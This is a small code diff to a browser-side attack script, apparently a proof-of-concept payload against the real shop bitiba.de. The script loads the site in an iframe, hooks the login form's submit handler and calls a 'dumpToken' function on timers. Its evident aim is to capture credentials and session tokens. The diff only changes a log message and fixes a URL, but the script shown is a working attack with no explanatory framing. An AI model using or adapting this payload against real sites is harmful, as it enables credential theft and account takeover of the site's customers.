@@ -1,4 +1,4 @@
-console.log(document.domain);
+console.log("KHARAONE >>>>>>>>>>>> DOMAIN IS :" + document.domain);
 var a=document.createElement("iframe");
 a.src="https://www.bitiba.de/checkout/logout.htm";
 a.name="mainsite";
@@ -23,6 +23,6 @@ function dumpToken(){
 function hookMessageHandler(){
     mainsite.loginForm.onsubmit = (e) => {formHandler(e);};
 }
-mainsite.location = "www.bitiba.de/account/overview"
+mainsite.location = "https://www.bitiba.de/account/overview"
 setTimeout(hookMessageHandler, 3000);
 setTimeout(dumpToken, 5000);
